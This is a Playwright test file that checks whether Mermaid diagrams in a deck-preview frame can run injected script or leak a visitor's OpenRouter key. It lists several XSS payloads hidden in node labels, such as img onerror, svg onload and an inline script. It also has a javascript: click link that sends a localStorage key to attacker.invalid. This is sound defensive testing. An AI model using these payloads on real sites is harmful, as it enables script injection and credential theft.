import { expect, test } from './studio-fixture';

// ── #1246: Mermaid renders AFTER sanitizeSlideHtml ────────────────────────────────────
//
// `deck-preview.js` sanitizes the slide HTML, but at that moment a diagram is still an
// inert ```mermaid source fence, so DOMPurify sees escaped text and passes it through —
// correctly. Mermaid then renders CLIENT-SIDE, after sanitization, and the runtime assigns
// the returned SVG straight to `target.innerHTML` (lib/runtime/index.js — on the fresh
// render AND again on the cache replay). Nothing sanitizes between those two points, and
// the preview frame is SAME-ORIGIN and un-sandboxed, which is the origin HARD RULE #24
// puts the visitor's OpenRouter key in.
//
// WHAT CONTAINS IT IS TWO DIFFERENT MECHANISMS, and conflating them is easy — this suite
// was written on the assumption it was one, and measuring refuted that. Read Mermaid 11's
// `sanitizeText` / `sanitizeMore`:
//
//   · NODE LABELS are sanitized UNCONDITIONALLY. `sanitizeText` always runs
//     `DOMPurify.sanitize(…, { FORBID_TAGS: ['style'] })`; `securityLevel` only decides
//     whether an EXTRA `removeScript` pass runs on top. So the label arms below are pinning
//     Mermaid's own DOMPurify, NOT our `securityLevel`, and — measured — they stay green
//     with the runtime flipped to `loose`.
//   · `securityLevel: 'strict'` (lib/runtime/index.js PREVIEW_ONLY_CONFIG) governs URL
//     handling: `formatUrl` runs `sanitizeUrl` on a link unless the level is `loose`, and
//     `setClickFun` refuses to bind a click callback at all unless it is. That is what the
//     `click` arm pins, and flipping the runtime to `loose` DOES turn that arm red —
//     verified by rebuilding the runtime and the docs site against a mutated source.
//
// It is a Mermaid SECURE KEY either way — `sanitize` deletes it from anything that is not
// `initialize` — so a deck's own `%%{init}%%` structurally cannot opt back out.
//
// WHY THESE ARE BEHAVIORAL and not a source assertion: both mechanisms are claims about a
// THIRD-PARTY library, and `package.json` floats Mermaid on a range. A unit test reading
// `securityLevel === 'strict'` stays green through an upgrade that changes what strict
// means, and says nothing at all about the label sanitizer that is doing most of the work.
// Re-sanitizing the SVG ourselves instead is not available: measured through the real
// `createSlideSanitizer`, DOMPurify deletes `<foreignObject>` and `<style>`, i.e. every
// htmlLabels node label and every diagram's generated styling.
//
// WHAT THESE DELIBERATELY DO NOT ASSERT — an external `<img src>` in a node label. It does
// fire, and it is NOT a Mermaid escalation: measured on this same surface, a plain markdown
// `![](https://…)`, an inline `style="background-image:url(…)"`, and a raw `<img>` tag all
// fire the identical request through fully-sanitized slide HTML. Remote subresource loading
// is the product's deliberate posture (`lib/core/sanitize-slide-html.mjs` keeps inline
// `style` for exactly that reason — "a resource load, not script"), so asserting it here
// would demand of diagrams what nothing else on the surface does. The line that matters,
// and the one these pin, is SCRIPT.
//
// The structural half — that a FUTURE render path could inject post-sanitize DOM the same
// way and no gate would notice — is `checkRuntimeMarkupSinks` in tools/check-ownership.js.

const SOURCE_KEY = 'lattice-docs-pg-source';

/** Anything this host sees is an exfiltration. Routed (never resolved) so a live vector is
 *  recorded rather than actually sent, and so the run does not depend on DNS — `.invalid`
 *  fails at lookup, which would otherwise be indistinguishable from "the payload was blocked". */
const ATTACKER = 'attacker.invalid';

type Probe = { hits: string[]; navigations: string[] };

/** Seed a deck as the visitor's draft, open the Playground on it, and record every request
 *  and navigation reaching the attacker host from ANY frame. */
async function openDeck(page: import('@playwright/test').Page, mermaidSrc: string): Promise<Probe> {
	const probe: Probe = { hits: [], navigations: [] };
	await page.context().route(`**://${ATTACKER}/**`, (route) => {
		probe.hits.push(route.request().url());
		return route.fulfill({ status: 200, contentType: 'image/gif', body: '' });
	});
	page.on('framenavigated', (f) => {
		if (f.url().includes(ATTACKER)) probe.navigations.push(f.url());
	});

	await page.addInitScript(
		([key, src]) => {
			try {
				localStorage.setItem(key as string, src as string);
			} catch {
				/* a blocked store just means the draft does not seed */
			}
		},
		[SOURCE_KEY, `# Diagram\n\n\`\`\`mermaid\n${mermaidSrc}\n\`\`\`\n`],
	);
	await page.goto('/playground/?view=edit', { waitUntil: 'domcontentloaded' });

	// The REAL Mermaid, from the real CDN the preview names — no stub. A stubbed Mermaid
	// would make every assertion here vacuous, since Mermaid's own sanitizer IS the subject.
	const preview = page.frameLocator('#preview');
	await expect(preview.locator('.lattice')).toBeVisible({ timeout: 40_000 });
	// Wait on the runtime's own settle stamp rather than a fixed delay: the fence carries
	// `data-mermaid-state` once the render resolves either way.
	await expect(preview.locator('pre[data-mermaid-state]').first()).toHaveAttribute('data-mermaid-state', /rendered|error/, {
		timeout: 40_000,
	});
	return probe;
}

// ── The SCRIPT boundary — the thing `strict` is actually load-bearing for ──────────────
//
// Every shape below is a way to get script to run out of a node label, which in this frame
// is OpenRouter-key theft. They are table-driven because the failure mode this whole area
// keeps hitting is fixing one twin and declaring the class closed: a single `<img onerror>`
// arm would have said nothing about `<svg onload>`, `<details ontoggle>`, or `<iframe
// srcdoc>`. All seven measured silent on Mermaid 11.14; this is what keeps them that way.
// NO DOUBLE QUOTES IN ANY PAYLOAD, and that is a correctness requirement rather than
// style: a mermaid node label is delimited by `"`, so an inner `"` makes Mermaid throw —
// the diagram never renders, nothing can run, and the arm passes while testing NOTHING.
// The first cut of this table had exactly that bug in 6 of 7 rows, and only the
// `data-mermaid-state: rendered` assertion below exposed it.
//
// The oracle is `top.__pwned`, not a network beacon: it detects script EXECUTION directly,
// and reaching `top` from the preview frame is the actual harm (that is the origin holding
// the visitor's OpenRouter key). It also needs no quotes.
const SCRIPT_VECTORS: Array<{ name: string; label: string; click?: boolean }> = [
	{ name: 'img onerror', label: '<img src=x onerror=top.__pwned=1>one' },
	{ name: 'img onerror quoted', label: "<img src=x onerror='top.__pwned=1'>one" },
	{ name: 'anchor javascript:', label: "<a href='javascript:top.__pwned=1'>one</a>", click: true },
	{ name: 'svg onload', label: "<svg onload='top.__pwned=1'></svg>one" },
	{ name: 'details ontoggle', label: "<details open ontoggle='top.__pwned=1'>one</details>" },
	{ name: 'iframe javascript: src', label: "<iframe src='javascript:top.__pwned=1'></iframe>one" },
	{ name: 'inline script', label: '<script>top.__pwned=1</script>one' },
	{ name: 'video onerror', label: "<video src=x onerror='top.__pwned=1'></video>one" },
	{ name: 'body onload via svg', label: "<svg><animate onbegin='top.__pwned=1' attributeName=x dur=1s/></svg>one" },
];

for (const v of SCRIPT_VECTORS) {
	test(`no script escapes a mermaid node label: ${v.name}`, async ({ page }) => {
		const probe = await openDeck(page, `flowchart TD\n  A["${v.label}"] --> B[two]`);
		const preview = page.frameLocator('#preview');
		// ANTI-VACUITY, and it is not theoretical: a payload that makes Mermaid throw produces
		// no DOM at all, so "nothing exfiltrated" would be green while testing nothing. Assert
		// the diagram actually rendered AND that the label's benign half is on screen, so the
		// payload provably reached the DOM and it is the sanitizer being measured, not the parser.
		await expect(preview.locator('pre[data-mermaid-state]').first()).toHaveAttribute('data-mermaid-state', 'rendered');
		await expect(preview.locator('svg foreignObject').filter({ hasText: 'one' }).first()).toBeAttached();

		// Some shapes only fire on interaction; drive that too rather than calling an
		// un-clicked link contained.
		if (v.click) {
			const target = preview.locator('svg foreignObject a').first();
			if (await target.count()) await target.click({ force: true }).catch(() => {});
		}
		// Give anything that survived time to actually run.
		await page.waitForTimeout(1500);

		expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned), `${v.name} EXECUTED script in the top docs origin`).toBeUndefined();
		expect(probe.hits.concat(probe.navigations), `${v.name} reached the network from the preview frame`).toEqual([]);
	});
}

// ── The `click` directive (the vector #1246 was filed for; closed by `strict` in #1314) ─
//
// Under `loose`, `click A href "javascript:…"` renders as `<a xlink:href="javascript:…">`
// inside the SVG, and clicking the node executes it in the preview's origin.
test('a mermaid click directive cannot run javascript: in the preview frame', async ({ page }) => {
	const js = `javascript:top.location='https://${ATTACKER}/steal?k='+encodeURIComponent(localStorage.getItem('lattice-db-or-key')||'')`;
	const probe = await openDeck(page, `flowchart TD\n  A[Open the full report]\n  click A href "${js}" "Open"`);

	const preview = page.frameLocator('#preview');
	// No live `javascript:` URL in the injected SVG, under either link attribute.
	const links = await preview
		.locator('svg a')
		.evaluateAll((els) => els.map((el) => el.getAttribute('href') || el.getAttribute('xlink:href') || ''));
	expect(links.filter((h) => /^\s*javascript:/i.test(h)), 'mermaid emitted a javascript: link').toEqual([]);

	// And clicking the node does nothing — the assertion #1246's acceptance names.
	const node = preview.locator('.node').first();
	if (await node.count()) await node.click({ force: true }).catch(() => {});
	await page.waitForTimeout(1000);
	expect(probe.hits.concat(probe.navigations), 'clicking the node exfiltrated').toEqual([]);
});

// ── What `strict` COSTS, named — #1246's third acceptance criterion ────────────────────
//
// The `securityLevel: 'loose'` this replaced was commented as "required to allow HTML (e.g.
// <br/>) in node labels". That was not true on Mermaid 11, and this is the test that says so
// out loud: if a future Mermaid makes `strict` imply `htmlLabels: false`, node labels
// collapse to a single line across every deck in the repo and only this fails.
test('`strict` still renders a <br/> line break inside a node label', async ({ page }) => {
	await openDeck(page, 'flowchart TD\n  A["first line<br/>second line"] --> B[tail]');

	const preview = page.frameLocator('#preview');
	// htmlLabels renders the label as HTML in a foreignObject, so the break is a real
	// element — not two `<tspan>`s and not one flattened string.
	// Scoped by CONTENT, not by position: a flowchart emits a foreignObject per node (and
	// per edge label), so `.first()` is whichever Mermaid happened to lay out first.
	const label = preview.locator('svg foreignObject').filter({ hasText: 'first line' }).first();
	await expect(label.locator('br').first()).toBeAttached({ timeout: 20_000 });
	// `textContent`, not `innerText`: an SVG-owned node is not an HTMLElement.
	const text = ((await label.evaluate((el) => el.textContent)) || '').replace(/\s+/g, ' ');
	expect(text).toContain('first line');
	expect(text).toContain('second line');
});
